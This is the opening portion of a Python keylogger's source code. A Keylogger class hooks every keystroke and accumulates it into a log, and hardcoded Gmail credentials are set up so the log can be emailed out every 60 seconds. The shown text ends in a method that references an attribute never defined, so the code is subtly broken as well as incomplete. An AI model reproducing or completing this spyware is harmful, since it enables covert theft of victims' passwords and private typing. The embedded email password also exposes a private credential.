import keyboard #Keyboard library is used to get full control of the keyboard.
import smtplib #For sending email using SMTP Protocol
#Timer is to make a method runs after an "interval" amount of time
from threading import Timer
from datetime import datetime

#Inititalizing the parameters
SEND_REPORT_EVERY = 60 # Every 60 seconds it will send a report
EMAIL_ADDRESS = "arpit1343.as@gmail.com"
EMAIL_PASSWORD = "Cicada3301"

class Keylogger:
    def __init__(self, interval, report_method = "email"):
        self.interval = interval #Here we are gonna pass SEND_REPORT_EVERY to the interval
        self.report_method = report_method
        #This string variable will hold all the logs of all the keystrokes within 'self.interval'
        self.log = " "
        #Record start & end datetimes
        self.start = datetime.now()
        self.end = datetime.now()
    # This callback is invoked whenever a keyboard event
    def callback(self,event):
        name = event.name
        if len(name) > 1:
            if name == "space": #" " instead of space to avoid misunderstanding
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        #Finally, we will add the key name to  our global 'self.log' varible
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)



